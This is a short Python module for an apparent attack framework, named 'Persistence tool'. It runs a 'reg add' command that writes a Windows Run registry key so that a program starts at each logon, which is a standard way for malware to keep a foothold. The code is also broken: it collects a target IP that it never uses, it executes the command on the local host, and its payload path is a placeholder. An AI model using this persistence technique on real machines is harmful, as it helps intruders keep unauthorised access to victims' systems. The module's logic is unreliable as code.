import os, pyfiglet
from collections import OrderedDict

MODULE_TYPE = "exploit"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Persistence tool',
            'Rank':'Good',
            'Platform':'Windows/win32',
            'architectures':'x86/64 bit processors',
            'Description': 'Persistence Module for payloads on Target',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('RHOST', ('Enter target IP )', False,'')),
           
               
                ])
                }
    def logo(self):
    	title = 'Persistence tool'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set RHOST <ip_address> , then run")
   
    def persistence(self):
      command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MyApp /t REG_SZ /d C:\\path\\to\\your\\app.exe"
      os.system(command)
    
    
    def execute(self):
        self.logo()
        host = self.info['Options']['RHOST'][0]
        self.persistence()
        
        return f"[+] Maintaining ..."
    